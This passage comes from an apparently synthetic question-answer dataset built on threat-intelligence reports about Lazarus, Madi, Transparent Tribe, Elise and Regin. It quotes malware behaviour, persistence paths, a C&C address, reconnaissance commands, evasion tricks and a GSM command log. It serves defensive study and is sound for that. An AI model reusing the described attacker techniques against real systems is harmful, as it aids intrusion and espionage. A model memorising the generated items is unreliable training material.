card information to a C&C. Second, Ratankba's supported commands include success and killkill that function identically to the respective PowerRatankba commands. Furthermore, a sleep loop of 900 seconds (15 minutes) is utilized in both Ratankba and RatankbaPOS' dropper (Fig. 56,56).\nLastly, while further analyzing the M2Soft exploit discussed in the Obfuscation section, a familiar destination directory of C:\\windows\\temp\\ was spotted in the deobfuscated JS (Fig. 57,58). This destination directory was also used during the PowerRatankba CHM campaign, by RatankbaPOS for log and implant storage, and by the FEIB spreader.\nMedium Headline: Code Overlap\nOn or before October 3rd, 2017, the Far Eastern International Bank (FEIB) in Taiwan was (<https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html>)hacked by Lazarus Group to steal money via the SWIFT system. One of the implants (9cc69d81613285352ce92ec3cb44227af5daa8ad4e483ecc59427fe23b122fce) utilized in that attack was a loader and spreader that writes itself to the Windows temp directory: c:\\windows\\temp\\. This directory is also used by numerous other Lazarus Group implants including by the RatankbaPOS dropper for the payload drop location as well as for RatankbaPOS logging. Additionally, there are several instances of code overlap between RatankbaPOS and the FEIB spreader implant. One such overlap includes the way in which each implant sets up persistence in almost precisely the same way (Fig. 59).\nMedium Headline: Decoys\nContent found in a PowerRatankba JS downloader decoy (transaction.pdf downloaded by transaction.js) was previously utilized in Lazarus campaigns using techniques that have more traditionally, to our knowledge, been used for espionage rather than for financial gain. The campaign occurred on August 4th, 2017, where Lazarus Group impersonated a National police officer of South Korea along with a malicious Microsoft Office Excel document. The malicious Excel attachment utilized a macro-based VBScript XOR dropper technique that has been very well (<https://researchcenter.paloaltonetworks.com/2017/04/unit42-the-blockbuster-sequel/>)documented in public already.\nThe document used in this attack was named \ube44\ube44\ube44\ube44 \ube44\ube44\ube44\ube44.xls (b46530fa2bd5f9958f664e754ae392dc400bd3fcb1c5adc7130b7374e0409924), which roughly translates to \"Bitcoin transaction history.\" Using the macro-based VBScript XOR dropper technique a CoreDn downloader implant is dropped to disk with a C&C of www.unsunozo[.]org. The interesting overlap with the PowerRatankba campaigns can be found in the lure used by the Excel spreadsheet (Fig. 60). The highlighted transactions, after the \"Final bitcoin Address\" section match with the beginning of the transactions used in the PowerRatankba decoy transaction.pdf.\nOn a final note for this aspect of the actor attribution, campaigns utilizing the VBScript XOR macro technique have historically been used for attacks more closely associated with espionage than for direct financial gain, as was the case when several campaigns targeted the personal accounts of employees at (<https://researchcenter.paloaltonetworks.com/2017/08/unit42-blockbuster-saga-continues/>)US defense contractors. This behavior may offer a clue as to the desperation North Korea has for (<https://en.wikipedia.org/wiki/Room_39>)procuring currency through illicit means, possibly due to the economic sanctions imposed on the regime. This may indicate that there has been a significant shift in directives for the Lazarus team(s) that historically conducted espionage campaigns. Furthermore, several of the campaigns utilizing the old VBScript XOR macro technique have direct or within-one-week overlap with PowerRatankba campaigns alluding to the possibility that there is in fact more than one team working under the North Korean umbrella as other companies have suggested (e.g., Kaspersky's excellent write-up on (<https://securelist.com/files/2017/04/Lazarus_Under_The_Hood_PDF_final.pdf>)Bluenoroff).\nMedium Headline: C&C\nA report was found in a Facebook post from mickeyfintech that listed a domain utilized in several PowerRatankba campaigns as being associated with infrastructure utilized in the breach of the FEIB (Fig. 61). The domain, trade.publicvm[.]com, was allegedly connected to the FEIB hack. That domain was also used by several PowerRatankba downloaders and payloads for hosting as well as C&C. This is a low confidence indicator as we have been unable to corroborate if that domain was in fact utilized by Lazarus in the hacking of the FEIB.\nFigure 61: Facebook post listing PowerRatankba domain as being associated with FEIB breach\n\nWhat are the similarities in functionality and command structures between Ratankba, PowerRatankba, and RatankbaPOS, and how do these similarities aid in attributing these tools to the Lazarus Group?",
    "output": "Ratankba, PowerRatankba, and RatankbaPOS share several similarities in functionality and command structures. For instance, they use the same BaseInfo parameter for initial POST requests to the C&C server and have identical supported commands like 'success' and 'killkill.' Additionally, they utilize a common directory, c:\\\\windows\\\\temp\\\\, for storing implants and logs. These overlaps in functionality and command structures suggest a shared development framework or common authorship, which supports the attribution of these tools to the Lazarus Group. Understanding these similarities helps in identifying patterns and linking different malware campaigns to the same threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Installation\nThe infostealer is installed by one of the various downloaders used in the attacks, which can be separated into two categories:\nDownloaders using the social engineering techniques described in our first blog post (displaying pictures, movies, documents etc.) to trick the user\nDownloaders that simply download and install the infostealer\nBoth types of downloaders copy themselves as \"UpdateOffice.exe\" into the \"Printhood\" directory, e.g.: \"C:Documents and Settings%USER%PrintHoodUpdateOffice.exe\" where they start executing.\nBoth the infostealer and downloaders create fake files with random names in their respective folders. The downloaders also drop some files which assist the malware (see our first blog for details).\nOnly one file will be used by the infostealer: nam.dll. This file is created by the downloader in the \"Templates\" directory (e.g.: \"C:Documents and Settings%USER%Templatesnam.dll\") and contains a BOT prefix/build that will be used by the infostealer when connecting to the command and control server (C&C). In order to download and install the infostealer, the downloaders connect to the C&C server to request an HTM page.\nOlder variants use http://[C&C address]/ASLK/khaki/Abi/UUUU.htm, whereas more recent ones use \"http://[C&C address]/ASLK/asgari/mah/UeUeUeUe.htm\".\nThe HTM page is a copy of Google index, with a double BASE64 encoded executable embedded in the page:\nThe keyword \"tamamshodfile\" at the bottom will be explained in the 'Infostealer analysis' section below.\nThe downloaders simply parse the HTM file, and decode the Base64 payload twice and save the resulting PE file as \"iexplore.exe\" in the \"Templates\" directory. Once downloaded, the infostealer is executed.\nQuestion: How does the Madi infostealer ensure it successfully connects to its Command and Control (C&C) server, and what role does the 'nam.dll' file play in this process?",
    "output": "Answer: The Madi infostealer ensures successful connection to its Command and Control (C&C) server through a series of steps involving both the downloader and the infostealer itself. Initially, the downloader copies itself as 'UpdateOffice.exe' into the 'PrintHood' directory and starts executing. During this process, the downloader creates several fake files with random names in their respective folders. One crucial file created by the downloader is 'nam.dll', which is placed in the 'Templates' directory. This 'nam.dll' file contains a BOT prefix/build that the infostealer uses when connecting to the C&C server. To download and install the infostealer, the downloaders connect to the C&C server to request an HTM page. Older variants use a specific URL pattern, while newer ones use a different pattern. The HTM page contains a double BASE64 encoded executable embedded within it, disguised as a copy of the Google index. The downloaders parse this HTM file, decode the Base64 payload twice, and save the resulting PE file as 'iexplore.exe' in the 'Templates' directory. Once downloaded, the infostealer is executed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat actor profile\nTransparent Tribe is a suspected Pakistan-linked threat actor. This group targets individuals and entities associated with governments and military personnel in the Indian subcontinent, specifically Afghanistan and India. Transparent Tribe has also been known to use their CrimsonRAT implant against (<https://www.amnesty.org/en/documents/asa33/8366/2018/en/>)human rights activists in Pakistan.\nThe group primarily uses three Windows-based malware families to carry out espionage activities against their targets.\nCrimsonRAT is a .NET-based implant that has been the group's malware of choice since at least 2020 . Transparent Tribe's multiple campaigns leveraging over the years indicate a steady evolution in the implant's capabilities.\nObliqueRAT is a C/C++-based implant discovered by Talos in early . ObliqueRAT is primarily reserved for highly targeted attacks on government personnel and in operations where stealth is a prime focus of the attackers' infection chain. This implant has also seen a (<https://blog.talosintelligence.com/2021/02/obliquerat-new-campaign.html>)constant evolution in deployment tactics and malicious functionalities over time.\nCustom malware used by Transparent Tribe consists of easily and quickly deployable downloaders, droppers and lightweight RATs containing limited capabilities as opposed to CrimsonRAT and ObliqueRAT.\nTransparent Tribe also maintains a suite of mobile implants in their arsenal. Implants such as (<https://www.trendmicro.com/en_us/research/22/a/investigating-apt36-or-earth-karkaddans-attack-chain-and-malware.html>)CapraRAT are constantly modified to be deployed against targets. These implants contain a plethora of malicious capabilities meant to steal data from mobile devices.\nMedium Headline: Latest variant\nThe latest downloaders primarily masquerade as installers for Kavach and are distributed for delivering malicious artifacts to targets. Kavach is widely used by government personnel, as it allows employees (including military personnel) to access the Indian government's I.T. resources, such as email services.\nThe droppers are .NET-based executables. They begin execution by checking if the timezone on the infected endpoint contains keywords such as \"India.\" A splash screen is displayed to the victim notifying them that the Kavach application is being installed:\nFake installation splash screen\nThe downloaders will then reach out to a malicious website, masquerading as a legitimate Indian government or pseudo-government entity, to download a malicious payload that is then activated on the endpoint.\nNext, download a legitimate copy of the Kavach application's MSI installer from yet another attacker-controlled website and execute it to make the whole attack chain appear legitimate.\nDownloader fetching and executing malicious payload and legitimate installer for Kavach.\nMedium Headline: Additional variant\nAnother variation of the initial infection vector used in the campaign is a notably large downloader binary (141MB) that contains the entire legitimate installer (MSI) for the Kavach application in its resources. The zipped copy of the MSI is extracted from the downloader's resources and executed on the system as a decoy to appear legitimate to the targets. The actual implant is then downloaded from a remote location, AES-decrypted using a hardcoded key, written to disk and executed on the infected endpoint.\nThe second variant of the downloader downloads and decrypts the payload from a remote location.\nMedium Headline: A timeline of older variants\nAs early as June 2021, the attackers primarily used malicious documents (maldocs) as an initial infection vector to deliver the malicious downloaders. This vector consisted of a malicious macro that would download and activate the downloader on the infected endpoint. This practice continued into July 2021.\nHowever, beginning with June 2021, there was also a steady evolution in the distribution tactics used in this campaign. Around this time, we began observing the use of nontraditional initial entry mechanisms throughout the course of this campaign, suggesting a clear intention of aggressively infecting targets for espionage.\nFor instance, in June 2021, the attackers used IMG files for distribution, containing multiple infection artifacts \u2014 all COVID-19 themed \u2014 to trick targets into getting infected. Wrapping malware in IMG files is a tactic gaining traction with crimeware operators and APTs as a way to deliver malware to victims since newer versions of the Windows OS natively support IMG files.\nMalicious IMG distributed by Transparent Tribe.\nThe malicious image consists of four files:\nMalicious Python-based stager.\nDecoy PDF document containing a COVID-19-themed lure.\nVBS file for executing the stager and displaying the decoy.\nMalicious LNK file for activating the VBS on the endpoint.\nIn September 2021, the actors switched up their initial infection artifact and used VHDX files delivering the malicious droppers. VHDX files (<https://docs.microsoft.com/en-us/archive/blogs/ie/mark-of-the-web>)Mark Of the Web (MOTW) stamps and thus artifacts such as maldocs, delivered through these wrappers aren't identified as originating from the internet by Microsoft utilities such as Word, Excel etc. - allowing the attackers to run malicious code on the endpoint without any Microsoft warnings.\nThe variant of the downloaders used here, previously disclosed by (<https://blog.cyble.com/2021/09/14/apt-group-targets-indian-defense-officials-through-enhanced-ttps/>)Cyble, masqueraded as an app from the (<http://csdindia.gov.in/>)Canteen Stores Department (CSD) of the Government of India. On execution, this variant would open the legitimate website for CSD on the target's system. However, as seen previously with Transparent Tribe, the threat actors continued the development of similar infection chains consisting of various themes to distribute their malware without regard for any previous public disclosures.\nThe threat actor then introduced the use of RAR archives to distribute malicious malware in November 2021. The RAR archive consisted of the downloader, this time downloading a highly specific decoy PDF containing the work history of an Indian government official. The RAR archives are typically password-protected and hosted on public media sharing websites. Therefore, it is highly likely that Transparent Tribe used spearphishing emails to deliver download URLs for the archives to their targets via emails containing the passwords for the archives.\nTimeline of evolution of entry vectors:\nMedium Headline: CrimsonRAT\nCrimsonRAT is a popular malware RAT implant that consists of a wide variety of capabilities. It is the staple implant of choice for Transparent Tribe to establish long-term access into victim networks. This RAT is actively worked upon and has seen considerable updates over the years in not just the development of new capabilities, but also to obfuscate the implant by the APT group.\nThe latest version of CrimsonRAT seen in this campaign in January and February 2022 contains a number of capabilities, including:\nList files and folders in a directory path specified by the C2.\nRun specific processes on the endpoint \u2014 keylogger and USB modules.\nList process IDs and names running on the endpoint.\nGet information such as name, creation times and size of image files (pictures such as BMP, JPG etc.) specified by the C2.\nTake screenshots of the current screen and send it to C2.\nUpload keylogger logs from a file on disk to the C2.\nSend system information to C2 including:\nComputername, username, Operating System name, filepath of implant, parent folder path.\nIndicator of whether the keylogger module is in the endpoint and running and its version.\nIndicator of whether the USB module is in the endpoint and running and its version.\nRun arbitrary commands on the system.\nWrite data sent by C2 to a file on disk.\nRead contents of a file on disk and exfiltrate to C2.\nList all drives on the system.\nList all files in a directory.\nDownload the USB worm and keylogger modules from the C2 and write them to disk.\nSend a file's name, creation time and size to the C2- file path is specified by the C2.\nDelete files specified by the C2 from the endpoint.\nGet names, creation times and size of all files containing the file extension specified by the C2.\nCode Snippet: CrimsonRAT command handler.\nSeen in:\nJan-Feb 2022: Deployed by Kavach-themed downloaders.\nMedium Headline: Lightweight implant\nA new lightweight, .NET-based implant was also seen in this campaign in several infection chains. This implant has limited capabilities when compared to CrimsonRAT but contains enough functionality to control and monitor the infected system. Capabilities include:\nList all running processes on the endpoint.\nDownload and execute a file from the C2.\nDownload and execute a file specified by the C2 from another remote location.\nClose connection with the C2 until the next run.\nGather system information from the endpoint such as Computer Name, username, public and local IPs, Operating system name, list of runnings AVs, device type (desktop or laptop).\nThe implant also persists via an InternetShortcut in the current user's Startup directory.\nImplant downloading and executing a file from a remote location.\nSeen in:\nJan-Feb 2022: Deployed by Kavach-themed downloaders.\nNovember 2021: Seen in infection chains using RAR archives hosted on CMS.\nSeptember 2021: Deployed by CSD-themed downloaders.\nQuestion: Describe the different initial infection vectors used by Transparent Tribe in their campaign, including the use of IMG files and VHDX files.",
    "output": "Answer: Transparent Tribe has used various initial infection vectors, including malicious documents with macros, IMG files, VHDX files, and RAR archives. In June 2021, they used IMG files containing multiple infection artifacts, such as a malicious Python-based stager, a decoy PDF document, a VBS file, and a malicious LNK file. In September 2021, they switched to VHDX files, which do not trigger Microsoft warnings due to Mark Of the Web (MOTW) stamps. The VHDX files masqueraded as an app from the Canteen Stores Department (CSD) of the Government of India. In November 2021, they used RAR archives containing a downloader and a decoy PDF, likely distributed via spearphishing emails.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Variant C\nThe third variant of Elise has its earliest compile timestamp in mid-2013 and has been used in attacks periodically since that time. This variant has been the most prevalent overall, accounting for roughly 75 percent of all samples identified by Unit 42. The most recent sample of variant C was compiled in late March of 2015. Additionally, variant C uses a 336-byte configuration structure.\nSimilar to variant B, variant C is often delivered via a file exploiting a client-side vulnerability, such as CVE-2012-0158. This particular variant is delivered as a single DLL with two exported functions \u2014 'Setting' and 'Update'\nWhen the 'Setting' export is called, the malware will copy itself to the following location:\n\u2022 %APPDATA%\\Microsoft\\Network\\rasphone.dll\nThis new file is then called via the following command:\n\u2022 Rundll32.exe %APPDATA%\\Microsoft\\Network\\rasphone.dll,Update\nWhen the 'Update' export is called on rasphone.dll, the malware will begin by checking if a debugger is attached via a call to IsDebuggerPresent(). In the event it is not detected, the malware will then check to ensure the DLL has been loaded by Rundll32. exe by comparing the current filename against 'dll32'.  rasphone.dll uses a simple string encryption routing. The following code can decrypt encountered strings:\nvoid decrypt_string(char *encrypted, int size) {   int i;  if ( encrypted )\n{    for ( i = size - 1; i > 0; --i )      encrypted[i] ^= encrypted[i - 1];    *encrypted ^= 0xA0;  }\n}\nThe malware continues to identify the location of iexplore.exe (%PROGRAM FILES%\\ Internet Explorer\\iexplore.exe) and spawn a new instance of this process. The malware will proceed to inject itself into iexplore.exe. Finally, the malware will decrypt an embedded DLL located in its resource section ('XDATA') and write this DLL to a new section of memory in iexplore.exe. A configuration blob of 336 bytes is subsequently written to this DLL, and the DLL is loaded into iexplore.exe via a call to LoadLibraryA.\nThe injected DLL (hereafter referred to as xdata) begins by spawning a new thread where all further actions will be taken. The malware writes its encrypted configuration to the following location:\n\u2022 %APPDATA%\\Microsoft\\Network\\6B5A4606.CAB\nThe following script can be used to decrypt this CAB file.\nAdditionally, this CAB file is \"time stomped\" to a Create/Modify time of Sunday, November 21, 2010, 10:29:33 UTC. This malware also writes to a log file located at the following path.\n\u2022 %TEMP%\\00EL225AF.TMP\nData in this file is not obfuscated or encrypted in any way. The malware proceeds to enter in a loop, where it will attempt to communicate with the specified URLs via either HTTP or HTTPS. The following has been identified about the structure of the binary data submitted via POST requests. This structure is consistent with all previous Elise variants discussed.\nFIGURE 20  + Elise Variant C Data Encoding.\nWhen an initial communication is made to the remote server, the malware will execute the following commands to conduct basic network reconnaissance:\n\u2022 net user\n\u2022 ipconfig /all\n\u2022 net start\n\u2022 systeminfo\nThis data is exfiltrated using a POST request, as seen below.\nFIGURE 21  + Elise Variant C POST Request.\nIn the above example, the '2320' value in the URI is generated using the victim's MAC address. The '00320511' value in the URI is generated using the current time. This allows each request to be unique and also identify the victim machine.\n\nAnswer this question based on the above context: What methods does Variant C of the Elise backdoor Trojan employ to store and obfuscate its configuration data, and how does it communicate with its command and control servers? Provide a detailed explanation.",
    "output": "Variant C of the Elise backdoor Trojan stores its configuration data by writing an encrypted configuration to the location '%APPDATA%\\\\Microsoft\\\\Network\\\\6B5A4606.CAB'. This CAB file is 'time stomped' to a specific date and time (Sunday, November 21, 2010, 10:29:33 UTC) to avoid suspicion. The malware also writes to a log file located at '%TEMP%\\\\00EL225AF.TMP', where the data is not obfuscated or encrypted. For communication with its command and control servers, the malware enters a loop where it attempts to communicate with specified URLs via HTTP or HTTPS. During the initial communication, it executes commands to conduct basic network reconnaissance, including 'net user', 'ipconfig /all', 'net start', and 'systeminfo'. This data is exfiltrated using a POST request. The URI in the POST request includes values generated from the victim's MAC address and the current time, ensuring each request is unique and identifiable to the victim machine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Association of Southeast Asian Nations (ASEAN): emerging economies as soft targets\nSince at least 2010, many APTs (likely China-based) have targeted the governments, militaries, and businesses of ASEAN, the Southeast Asian geopolitical and economic group composed of Brunei, Burma (Myanmar), Cambodia, Indonesia, Laos, Malaysia, Philippines, Singapore, Thailand, and Vietnam. Although chances of any regional war erupting in the near term are low, a large volume of ongoing, regional cyber espionage activity is a constant. Targeted industries include telecommunications, transportation, oil and gas, banks, and think tanks. The usual motivation is to gain tactical or strategic advantage within the political, military, and economic domains.39\nFireEye researchers are following numerous APT actors in this region, including BeeBus, Mirage, Check Command, Taidoor, Seinup, and Naikon. Their most common tactic is spear phishing, often using legitimate decoy documents that are related to the target's national economy or politics, or to regional events such as ASEAN summits, Asia-Pacific Economic Cooperation (APEC) summits, energy exploration, or military affairs.\n33 Herman, S. (15 Mar 2013) \"North Korea Blames US, South for 'Cyber Attack',\" Voice of America.\n34 \"Significant Cyber Incidents Since 2006,\" Center for Strategic and International Studies.\n35 \"India and Pakistan in cyber war,\" (4 Dec 2010) Al-Jazeera.\n36 Muncaster, P. (16 March 2012) \"Hackers hit 112 Indian gov sites in three months,\" The Register.\n37 \"Operation Hangover: Q&A on Attacks,\" (20 May 2013) Symantec.\n38 \"Snorre Fagerland, et al. \"Operation Hangover: Unveiling an Indian Cyberattack Infrastructure.\" May 2013.\n39 Finkle, J. (4 Aug 2011) \"'State actor' behind slew of cyber attacks,\" Reuters.\nFireEye believes that many of these regional economic organizations are attractive targets for APT campaigns because the information they possess is valuable and their level of cyber security awareness is low. Often, these organizations have inconsistent system administration, infrequent software patch management, poor policy control, or some combination of these issues. Thus, many of these networks are \"low-hanging fruit\" for attackers. And to make matters worse, compromised systems are used as staging grounds for further attacks on regional targets, by installing illicit command-and-control (CnC) servers, abusing legitimate email accounts, and disseminating stolen office documents as \"bait.\"\nMedium Headline: Russia\u2014a little bit \"too quiet?\"\nIn 1939, Winston Churchill declared that Russia was a \"riddle wrapped in a mystery inside an enigma \u2026\". Seven decades later, cyber defense researchers would say that not much has changed. Compared with the constant attacks detected from China, you can almost hear the snow falling on Red Square. One of the outstanding questions in cyber security today is: Where are the Russians? Perhaps they are simply great hackers. Maybe they have sufficient human intelligence. Whatever the reason, cyber defense analysts often look in vain for the traces of Russian cybercriminals. As a step toward finding some answers, however, consider the second half of Churchill's quote: \"\u2026 but perhaps there is a key\u2014 that key is Russian national interest.\"40 In other words, where there is smoke, there is usually fire.\nIn the mid-1990s, at the very dawn of the World Wide Web, Russia was engaged in a protracted struggle over the fate of Chechnya; the Chechens became pioneers in cyber propaganda, and the Russians became pioneers is shutting down their websites. In 1998, when Russian ally Serbia was under attack from NATO, pro-Serbian hackers jumped in the fray, targeting NATO with DoS attacks and at least twenty-five strains of virus-infected email. In 2007, Russia was the prime suspect in the most famous international cyber attack to date\u2014the punitive DDoS on Estonia for moving a Soviet-era statue.41\nIn 2008, researchers uncovered clear evidence that computer network operations played a supporting role in Russian military advances during its invasion of Georgia.42 Also in 2008, Russia was suspected in what U.S. Deputy Secretary of Defense William Lynn called the \"most significant breach of U.S. military computers ever\"\u2014an attack on Central Command (CENTCOM), delivered through an infected USB drive.43 In 2009, Russian cybercriminals were blamed in \"Climategate,\" a breach of university research intended to undermine international negotiations on climate change mitigation.44 In 2010, NATO and the European Union warned of increased Russian cyber attacks, while the FBI arrested and deported a possible Russian intelligence agent named Alexey Karetnikov, who had been working as a software tester at Microsoft.45\n40 \"Winston Churchill,\" Wikiquote.\n41 Geers K. (2008) \"Cyberspace and the Changing Nature of Warfare,\" Hakin9 E-Book, 19(3) No. 6; SC Magazine (27 AUG 08) 1-12.\n42 \"Overview by the US-CCU of the Cyber Campaign against Georgia in August of 2008,\" (Aug 2009) U.S. Cyber Consequences Unit.\n43 Lynn, W.J. (2010) \"Defending a New Domain: The Pentagon's Cyberstrategy,\" Foreign Affairs 89(5) 97-108.\n44 Stewart, W. & Delgado, M. (6 Dec 2009) \"Were Russian security services behind the leak of 'Climategate' emails?\" Daily Mail & \"Global warning: New Climategate leaks,\" (23 Nov 2011) RT.\n45 Ustinova, A. (14 Jul 2010) \"Microsoft Says 12th Alleged Russian Spy Was Employee,\" Bloomberg.\nOne ironic aspect of nation-state cyber attacks\u2014especially in authoritarian countries\u2014is that many of them are inward facing. In 2012, Russian security firm Kaspersky Lab announced the discovery of \"Red October,\"46 a cyber attack campaign that spied on millions of citizens around the world, but chiefly within the former Soviet Union. Targets included embassies, research firms, military bases, energy providers, nuclear agencies, and critical infrastructure.47 Similarly, in 2013, researchers found malware on millions of Android devices in Russia and in Russian-speaking countries. Either or both of these attacks could be partially explained as the Russian government keeping an eye on its own population, and that of neighboring countries.48\nOn the brighter side, as a step toward cyber d\u00e9tente, the U.S. and Russia in 2013 signed an agreement to build a cyber \"hotline\"\u2014similar to that used for nuclear scares during the Cold War\u2014to help defuse any computer-related crises in the future.49 But, just to be on the safe side, Russia is taking the extreme cyber defense measure of buying old-fashioned typewriters,50 and the Russian military is (like the U.S., China, and Israel) creating cyber warfare-focused units.51\nMedium Headline: Russian tactics\nThough relatively quiet, Russia appears to be home to many of the most complex and advanced cyber attacks FireEye researchers have seen. More specifically, Russian exploit code can be significantly stealthier than its Chinese counterpart\u2014which can also make it more worrisome. The \"Red October\" campaign, including its satellite software dubbed \"Sputnik,\" is a prominent example of likely Russian malware.\nTTP often includes the delivery of weaponized email attachments, though Russian cybercriminals appear to be adept at changing their attack patterns, exploits, and data exfiltration methods to evade detection. In fact, one telltale aspect of Russian hackers seems to be that, unlike the Chinese, they go to extraordinary lengths to hide their identities and objectives. FireEye analysts have even seen examples in which they have run \"false-flag\" cyber operations, designing their attack to appear as if it came from Asia.\n46 \"The 'Red October' Campaign\u2014An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies\" (14 Jan 2013) GReAT, Kaspersky Lab.\n47 Lee, D. (14 Jan 2013) \"'Red October'\" cyber-attack found by Russian researchers,\" BBC News\n48 Jackson Higgins, K. (3 Aug 2013) \"Anatomy of a Russian Cybercrime Ecosystem Targeting Android,\" Dark Reading.\n49 Gallagher, S. (18 Jun 2013) \"US, Russia to install 'cyber-hotline' to prevent accidental cyberwar,\" Ars Technica.\n50 Ingersoll, G. (11 Jul 2013) \"Russia Turns to Typewriters to Protect against Cyber Espionage,\" Business Insider.\n51 Gorshenin, V. (29 Aug 2013) \"Russia to create cyber-warfare units,\" Pravda.\nOne further problem for cyber defense researchers is that some Russian back doors into compromised systems are hard to distinguish from advanced cybercriminal break-ins.\nBig Headline: Middle East\nAs a region, the Middle East may not possess the arsenal of zero-day exploits available in Russia, or the brute-force numbers of China. Therefore, some Middle Eastern hackers may have to rely on cyber tactics that emphasize novelty, creativity, and deception.\nFor example, the 2012 Mahdi campaign, which infected targets in the Middle East, used malicious Word documents, PowerPoint files, and PDFs to infect targets. That approach is similar to many other attackers. But these attacks were accompanied by some imaginative elements such as games, attractive images, and custom animations specifically designed to aid in the attack.\nNot only did they trick users into executing commands to install malicious code, but they also distracted users from seeing malware-related warning messages. Furthermore, Mahdi attacks were tailored to specific target audiences\u2014for example by offering variations of games unique to each organization. Such pinpoint strikes rely on prior reconnaissance, help to evade cyber defense behavioral-detection mechanisms, and dramatically increase the odds of compromise. So in the Middle East, the relative sophistication of an attack may be calculated less in the technology, and more in the clever ways in which malware is delivered and installed on a target network.\nRead the text above and answer this question: What are some notable examples of Russian cyber activities and attacks, and how do they reflect Russian national interests?",
    "output": "Russian cyber activities and attacks have included pioneering efforts in cyber propaganda and website shutdowns during the Chechen conflict in the mid-1990s, DoS attacks and virus-infected emails targeting NATO during the Serbian conflict in 1998, the punitive DDoS attack on Estonia in 2007, and the use of computer network operations during the invasion of Georgia in 2008. Other notable incidents include the breach of U.S. military computers at CENTCOM in 2008, the 'Climategate' breach in 2009, and increased Russian cyber attacks reported by NATO and the EU in 2010. These activities reflect Russian national interests, as they often align with geopolitical goals and conflicts involving Russia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: GSM targeting\nThe most interesting aspect we have found so far regarding Regin relates to an infection of a large GSM operator. One VFS encrypted entry we located had internal id 50049.2, and appears to be an activity log on a GSM Base Station Controller.\nFrom\nAccording to the GSM documentation (): 'The Base Station Controller (BSC) is in control of and supervises a number of Base Transceiver Stations (). The BSC is responsible for the allocation of radio resources to a mobile call and for the handovers that are made between base stations under his control. Other handovers are under the control of the .'\nHere's a look at the decoded Regin GSM activity log:\nThis log is about 70KB in size and contains hundreds of entries like the ones above. It also includes timestamps that indicate exactly when the command was executed.\nThe entries in the log appear to contain Ericsson OSS MML (Man-Machine Language as defined by ITU-T) commands (see ).\nHere's a list of some commands issued on the Base Station Controller, together with some of their timestamps:\n2008-04-25 11:12:14: rxmop:moty=rxotrx;\n2008-04-25 11:58:16: rxmsp:moty=rxotrx;\n2008-04-25 14:37:05: rlcrp:cell=all;\n2008-04-26 04:48:54: rxble:mo=rxocf-170,subord;\n2008-04-26 06:16:22: rxtcp:MOty=RXOtg,cell=kst022a;\n2008-04-26 10:06:03: IOSTP;\n2008-04-27 03:31:57: rlstc:cell=pty013c,state=active;\n2008-04-27 06:07:43: allip:acl=a2;\n2008-04-28 06:27:55: dtstp:DIP=264rbl2;\n2008-05-02 01:46:02: rlstp:cell=all,state=halted;\n2008-05-08 06:12:48: rlmfc:cell=NGR035W,mbcchno=83&512&93&90&514&522,listtype=active; 2008-05-08 07:33:12: rlnri:cell=NGR058y,cellr=ngr058x;\n2008-05-12 17:28:29: rrtpp:trapool=all.\nDescriptions for the commands:\nrxmop - check software version type;\nrxmsp - list current call forwarding settings of the Mobile Station;\nrlcrp - list off call forwarding settings for the Base Station Controller;\nrxble - enable (unblock) call forwarding;\nrxtcp - show the Transceiver Group of particular cell;\nallip - show external alarm;\ndtstp - show Digital Path (DIP) settings (DIP is the name of the function used for supervision of the connected PCM (Pulse Code Modulation) lines); rlstc - activate cell(s) in the GSM network;\nrlstp - stop cell(s) in the GSM network;\nrlmfc - add frequencies to the active broadcast control channel allocation list;\nrlnri - add cell neighbor;\nrrtpp - show radio transmission transcoder pool details.\nThe log seems to contain not only the executed commands but also usernames and passwords of some engineering accounts:\nsed[snip]:Alla[snip]\noss:New[snip] administrator:Adm[snip]\nIn total, the log indicates that commands were executed on 136 different cells. Some of the cell names include 'prn021a, gzn010a, wdk004, kbl027a, etc...'. The command log we obtained covers a period of about one month, from April 25, 2008 through May 27, 2008. It is unknown why the commands stopped in May 2008 though; perhaps the infection was removed or the attackers achieved their objective and moved on. Another explanation is that the attackers improved or changed the malware to stop saving logs locally and that is why only some older logs were discovered.\nBig Headline: Communication and C&C\nThe C&C mechanism implemented in Regin is extremely sophisticated and relies on communication drones deployed by the attackers throughout the victim networks. Most victims communicate with another machine in their own internal network through various protocols as specified in the config file. These include HTTP and Windows network pipes. The purpose of such a complex infrastructure is to achieve two goals: (i) to give attackers access deep into the network, potentially bypassing air gaps; and (ii) to restrict as much as possible the traffic to the C&C.\nHere's a look at the decoded configurations::\nIn the above table we see configurations extracted from several victims that bridge together infected machines in what appears to be virtual networks: 17.3.40.x, 50.103.14.x, 51.9.1.x, 18.159.0.x. One of these routes reaches out to the 'external' C&C server at 203.199.89.80.\nThe numbers right after the 'transport' indicate the plugin that handles the communication. These are in our case:\n\u2022 27 - ICMP network listener using raw sockets\n\u2022 50035 - Winsock-based network transport\n\u2022 50037 - Network transport over HTTP\n\u2022 50051 - Network transport over HTTPS\n\u2022 50271 - Network transport over SMB (named pipes)\nThe machines located on the border of the network act as routers, effectively connecting victims from inside the network with C&Cs on the Internet.\nAfter decoding all the configurations we have collected, we were able to identify the following external C&Cs.\nOne particular case includes a country in the Middle East. It was rather astonishing, so we thought it should be mentioned. In this country all the victims we identified communicate with each other, forming a peer-to-peer network. The P2P network includes the president's office, a research center, an educational institution network and a bank.\nSpread across the country, these victims are all interconnected with each other. One of the victims contains a translation drone, which has the ability to forward packets outside the country, to the C&C in India.\nThis represents a rather interesting command-and-control mechanism, which is guaranteed to raise little suspicion. For instance, if all commands to the president's office are sent through the bank's network, then all the malicious traffic visible to the president's office sysadmins will only be with the bank, in the same country.\nBig Headline: Victim statistics\nOver the past two years we have been collecting statistics on the attacks and victims of Regin. These were aided by the fact that even after the malware is uninstalled, certain artifacts are left behind, which can help identify an infected (but cleaned) system. For instance, we have seen several cases where the systems were cleaned but the 'msrdc64.dat' infection marker was left behind.\nSo far, victims of Regin have been identified in 14 countries:\nIn total, we counted 27 different victims, although it should be pointed out that the definition of a victim here refers to a full entity, including its entire network. The number of unique PCs infected with Regin is of course much, much higher.\nFrom the map above, Fiji 